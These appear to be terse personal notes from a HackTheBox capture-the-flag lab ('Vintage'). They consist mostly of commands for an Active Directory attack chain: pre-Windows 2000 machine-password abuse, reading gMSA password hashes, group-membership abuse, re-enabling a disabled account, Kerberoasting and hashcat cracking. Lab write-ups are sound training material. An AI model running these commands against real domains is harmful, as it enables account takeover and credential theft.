-- bloodhound
bloodhound-python -c all -u p.rosa -p Rosaisbest123 -ns <ip> -d vintage.htb -> upload on server

fs01$ --- member of --- pre-windows 2000 compatible group: fs01$ might have the same password as id if Assign this computer as a pre-windows 2000 computer checked
nxc ldap <ip> -d vintage.htb -u 'fs01$' -p 'fs01' -k -> success
kinit fs01 -> put password -> get TGT as fs01$
nxc ldap -d dc01.vintage.htb -u 'fs01$' -k --gmsa -dc-ip <ip> -> fail because nxc uses ldaps automatically, need to change the code itself or use bloodyAD
bloodyAD -d vintage.htb --host dc01.vintage.htb -u fs01 -p 'fs01' -k  get object 'gmsa01$' --attr msDS-ManagedPassword -> get gmsa01$ ntlm hash

gmsa01$ -- add self --- servicemanagers
bloodyAD -d vintage.htb -u 'gmsa01$' -p <ntlm> --host dc01.vintage.htb -f rc4 -k add groupMember ServiceManagers 'gmsa01$'
  -> added to ServiceManager, can modify svc_sql(disabled), svc_ldap, svc_ark

getTGT.py 'vintage.htb/gmsa01$' -dc-ip <ip> -hashes :b3a15bbdfb1c53238d4b50ea2c4d1178 # Get TGT as gmsa01$
KRB5CCNAME=gmsa01$.ccache bloodyAD -d vintage.htb -u 'gmsa01$' -p 'b3a15bbdfb1c53238d4b50ea2c4d1178' --host dc01.vintage.htb -f rc4 -k remove uac svc_sql -f ACCOUNTDISABLE # enable user svc_sql

option 1. use targetedkerberoast
  KRB5CCNAME=gmsa01$.ccache targetedKerberoast/targetedKerberoast.py -d vintage.htb -k --no-pass --dc-host dc01.vintage.htb # extract all svc_ hashes
option 2. manually set spn to svc_ and nxc ldap
  bloodyAD -d vintage.htb -u 'gmsa01$' -p 'b3a15bbdfb1c53238d4b50ea2c4d1178' --host dc01.vintage.htb -f rc4 -k set object <svc_users> ServicePrincipalName -v '<anything>' # For all 3 users
  nxc ldap dc01.vintage.htb -u 'gmsa01$' -H 'b3a15bbdfb1c53238d4b50ea2c4d1178' -k --kerberoasting nxc.hashes

hashcat <hashfile> rockyou.txt -> get one password cracked
